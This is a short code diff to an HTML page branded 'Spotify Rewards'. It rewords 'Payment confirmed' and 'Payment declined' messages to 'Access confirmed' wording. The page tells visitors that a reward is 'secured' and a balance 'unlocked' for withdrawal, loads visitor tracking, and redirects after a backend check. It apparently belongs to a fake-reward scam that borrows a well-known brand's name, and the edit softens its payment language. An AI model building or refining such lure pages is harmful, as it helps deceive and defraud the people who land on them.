@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-  <title>Spotify Rewards - Payment Confirmed</title>
+  <title>Spotify Rewards - Access Confirmed</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
   <!-- Microsoft Clarity -->
@@ -110,7 +110,7 @@
       <svg viewBox="0 0 24 24"><polyline points="4.5 12.5 9.5 17.5 19.5 7" /></svg>
     </div>
 
-    <h1>Payment confirmed!</h1>
+    <h1>Access confirmed!</h1>
     <p class="sub"><strong>Thank you</strong> — your reward has been secured and your balance is now unlocked. Access your application to withdraw it.</p>
 
     <div class="row"><span>Status</span><b>CONFIRMED</b></div>
@@ -189,7 +189,7 @@
             if (data && data.ok) {
               setTimeout(go, 350);
             } else {
-              showError((data && data.error) || 'Payment declined. Please try again.');
+              showError((data && data.error) || 'Access could not be confirmed. Please try again.');
             }
           })
           .catch(function () {
